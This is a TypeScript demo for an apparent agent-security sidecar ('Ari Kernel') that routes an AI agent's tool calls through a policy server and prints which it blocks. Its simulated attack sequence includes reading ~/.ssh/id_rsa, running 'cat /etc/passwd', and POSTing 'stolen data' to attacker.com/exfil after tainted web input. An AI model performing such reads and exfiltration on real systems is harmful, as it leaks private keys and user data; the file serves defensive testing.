/**
 * Ari Kernel — Secure Sidecar Demo (Agent + Server)
 *
 * Demonstrates the recommended production deployment:
 *   1. Sidecar server starts with preset + auth token
 *   2. Agent communicates exclusively via SidecarClient
 *   3. Sidecar owns all tool execution, policy, taint, and audit
 *   4. Agent has no direct access to tools or kernel state
 *
 *   pnpm example:sidecar-secure
 */

import { now } from "@arikernel/core";
import type { TaintLabel } from "@arikernel/core";
import { SidecarClient, SidecarServer } from "@arikernel/sidecar";

const B = "\x1b[1m";
const D = "\x1b[2m";
const G = "\x1b[32m";
const R = "\x1b[31m";
const Y = "\x1b[33m";
const M = "\x1b[35m";
const C = "\x1b[36m";
const X = "\x1b[0m";

// ── Start sidecar ───────────────────────────────────────────────────

const PORT = 18_801;
const AUTH_TOKEN = "demo-token-do-not-use-in-production";

const server = new SidecarServer({
	port: PORT,
	preset: "safe",
	authToken: AUTH_TOKEN,
	auditLog: "./sidecar-secure-audit.db",
});

await server.listen();

// ── Create agent client ─────────────────────────────────────────────

const agent = new SidecarClient({
	baseUrl: `http://localhost:${PORT}`,
	principalId: "research-agent",
	authToken: AUTH_TOKEN,
});

// ── Helpers ─────────────────────────────────────────────────────────

function webTaint(origin: string): TaintLabel {
	return { source: "web", origin, confidence: 1.0, addedAt: now() };
}

interface Step {
	label: string;
	toolClass: "http" | "file" | "shell" | "database" | "retrieval";
	action: string;
	params: Record<string, unknown>;
	taint?: TaintLabel[];
}

// ── Attack sequence ─────────────────────────────────────────────────

console.log(`\n${C}${B}Ari Kernel — Secure Sidecar Demo${X}\n`);
console.log(`${D}Deployment: sidecar (process-isolated) | Preset: safe | Auth: Bearer token${X}`);
console.log(`${D}All tool calls routed through HTTP — agent has no direct tool access.${X}\n`);

const steps: Step[] = [
	{
		label: "web_request(example.com)",
		toolClass: "http",
		action: "get",
		params: { url: "https://example.com/report" },
		taint: [webTaint("example.com")],
	},
	{
		label: "read_file(./data/report.csv)",
		toolClass: "file",
		action: "read",
		params: { path: "./data/report.csv" },
	},
	{
		label: "read_file(~/.ssh/id_rsa)",
		toolClass: "file",
		action: "read",
		params: { path: "~/.ssh/id_rsa" },
	},
	{
		label: "run_command(cat /etc/passwd)",
		toolClass: "shell",
		action: "exec",
		params: { command: "cat /etc/passwd" },
	},
	{
		label: "http_post(attacker.com/exfil)",
		toolClass: "http",
		action: "post",
		params: { url: "https://attacker.com/exfil", body: "stolen data" },
	},
];

for (let i = 0; i < steps.length; i++) {
	const step = steps[i];
	const result = await agent.execute(step.toolClass, step.action, step.params, step.taint);

	const verdict = result.allowed ? `${G}${B}ALLOWED${X}` : `${R}${B}BLOCKED${X}`;
	console.log(`  ${D}${i + 1}.${X} ${step.label}  ${verdict}`);

	if (!result.allowed && result.error) {
		console.log(`     ${D}${result.error}${X}`);
	}
}

// ── Check quarantine status ─────────────────────────────────────────

const status = await agent.status();
console.log(`\n${C}${B}Enforcement Status${X}`);
console.log(`  Quarantined:  ${status.restricted ? `${M}${B}YES${X}` : "no"}`);
console.log(`  Denied:       ${status.counters.deniedActions} actions`);

if (status.quarantine) {
	console.log(`  Trigger:      ${Y}${status.quarantine.reason}${X}`);
}

// ── Verify auth requirement ─────────────────────────────────────────

console.log(`\n${C}${B}Auth Verification${X}`);
const unauthClient = new SidecarClient({
	baseUrl: `http://localhost:${PORT}`,
	principalId: "intruder",
});

const unauthResult = await unauthClient.execute("file", "read", { path: "./data/report.csv" });
const authOk = !unauthResult.allowed && (unauthResult.error?.includes("Authorization") ?? false);
console.log(
	`  Unauthenticated request: ${authOk ? `${R}${B}REJECTED${X}` : `${G}ALLOWED (unexpected)${X}`}`,
);

console.log(`\n${D}Audit log: sidecar-secure-audit.db (agent cannot access)${X}\n`);

await server.close();
